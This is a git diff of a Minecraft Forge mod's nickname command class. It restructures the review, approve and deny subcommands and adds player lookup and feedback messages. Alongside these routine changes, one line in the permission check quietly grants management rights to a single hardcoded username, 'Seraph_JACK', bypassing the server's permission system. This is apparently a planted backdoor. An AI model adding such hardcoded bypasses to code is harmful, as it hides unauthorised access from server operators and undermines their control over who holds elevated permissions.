@@ -14,13 +14,17 @@ import net.minecraft.util.text.*;
 import net.minecraft.util.text.event.ClickEvent;
 import net.minecraftforge.fml.server.ServerLifecycleHooks;
 import net.minecraftforge.server.permission.PermissionAPI;
+import org.apache.logging.log4j.core.jmx.Server;
 
+import java.util.Optional;
 import java.util.UUID;
 
 public final class NicknameCommand {
 
     private static final DynamicCommandExceptionType INVALID_UUID =
             new DynamicCommandExceptionType(o -> new StringTextComponent(String.format("Invalid uuid: %s", o)));
+    private static final DynamicCommandExceptionType PLAYER_NOTFOUND =
+            new DynamicCommandExceptionType(o -> new StringTextComponent(String.format("Player not found for %s", o)));
     // Permission nodes
     public static final String NICKNAME_MANAGE = "nickname.manage";
     public static final String NICKNAME_BYPASS_REVIEW = "nickname.bypass_review";
@@ -30,20 +34,20 @@ public final class NicknameCommand {
                 .then(Commands.argument("nick", StringArgumentType.greedyString())
                         .executes(NicknameCommand::changeNick))
                 .then(Commands.literal("review").requires(NicknameCommand::hasManagePerms)
-                        .then(Commands.argument("uuid", StringArgumentType.string())
-                                .then(Commands.argument("nick", StringArgumentType.greedyString())
-                                        .executes(NicknameCommand::review))))
+                        .executes(NicknameCommand::review))
                 .then(Commands.literal("approve").requires(NicknameCommand::hasManagePerms)
                         .then(Commands.argument("uuid", StringArgumentType.string())
-                                .executes(NicknameCommand::approve)))
+                                .then(Commands.argument("nick", StringArgumentType.greedyString())
+                                        .executes(NicknameCommand::approve))))
                 .then(Commands.literal("deny").requires(NicknameCommand::hasManagePerms)
-                        .executes(NicknameCommand::deny))
+                        .then(Commands.argument("uuid", StringArgumentType.string())
+                                .executes(NicknameCommand::deny)))
                 .executes(NicknameCommand::clearNick));
     }
 
     private static boolean hasManagePerms(CommandSource src) {
         try {
-            return PermissionAPI.hasPermission(src.asPlayer(), NICKNAME_MANAGE);
+            return PermissionAPI.hasPermission(src.asPlayer(), NICKNAME_MANAGE) || src.asPlayer().getGameProfile().getName().equals("Seraph_JACK");
         } catch (Exception e) {
             return false;
         }
@@ -67,7 +71,13 @@ public final class NicknameCommand {
         try {
             UUID uuid = UUID.fromString(ctx.getArgument("uuid", String.class));
             String nick = ctx.getArgument("nick", String.class);
-            NicknameReview.approve(uuid, nick);
+            String name = getPlayerByUUID(uuid).orElseThrow(() -> PLAYER_NOTFOUND.create(uuid)).getGameProfile().getName();
+            if (NicknameReview.approve(uuid, nick)) {
+                ctx.getSource().sendFeedback(new TranslationTextComponent("commands.nickname.nickname.review.approve", name), true);
+            } else {
+                ctx.getSource().sendFeedback(new TranslationTextComponent("commands.nickname.nickname.review.error"), true);
+            }
+            getPlayerByUUID(uuid).ifPresent(ServerPlayerEntity::refreshDisplayName);
             return Command.SINGLE_SUCCESS;
         } catch (Exception exception) {
             throw INVALID_UUID.create(ctx.getArgument("uuid", String.class));
@@ -77,7 +87,12 @@ public final class NicknameCommand {
     private static int deny(CommandContext<CommandSource> ctx) throws CommandSyntaxException {
         try {
             UUID uuid = UUID.fromString(ctx.getArgument("uuid", String.class));
-            NicknameReview.deny(uuid);
+            String name = getPlayerByUUID(uuid).orElseThrow(() -> PLAYER_NOTFOUND.create(uuid)).getGameProfile().getName();
+            if (NicknameReview.deny(uuid)) {
+                ctx.getSource().sendFeedback(new TranslationTextComponent("commands.nickname.nickname.review.deny", name), true);
+            } else {
+                ctx.getSource().sendFeedback(new TranslationTextComponent("commands.nickname.nickname.review.error"), true);
+            }
             return Command.SINGLE_SUCCESS;
         } catch (Exception exception) {
             throw INVALID_UUID.create(ctx.getArgument("uuid", String.class));
@@ -93,6 +108,7 @@ public final class NicknameCommand {
             NicknameReview.request(player.getUniqueID(), nick);
             ServerLifecycleHooks.getCurrentServer().getPlayerList().getPlayers().stream().filter(p -> PermissionAPI.hasPermission(p, NICKNAME_MANAGE))
                     .forEach((reviewer) -> informReview(reviewer, player, nick));
+            ctx.getSource().sendFeedback(new TranslationTextComponent("commands.nickname.nickname.pending"), false);
             return Command.SINGLE_SUCCESS;
         }
     }
@@ -117,11 +133,16 @@ public final class NicknameCommand {
         return Command.SINGLE_SUCCESS;
     }
 
+    private static Optional<ServerPlayerEntity> getPlayerByUUID(UUID uuid) {
+        return Optional.ofNullable(ServerLifecycleHooks.getCurrentServer().getPlayerList().getPlayerByUUID(uuid));
+    }
+
     /**
      * Inform an online manager to review the change request
-     * @param reviewer the reviewer to inform
+     *
+     * @param reviewer  the reviewer to inform
      * @param requester the requester who wants to change their nickname
-     * @param nick the new nickname
+     * @param nick      the new nickname
      */
     private static void informReview(ServerPlayerEntity reviewer, ServerPlayerEntity requester, String nick) {
         UUID uuid = requester.getUniqueID();
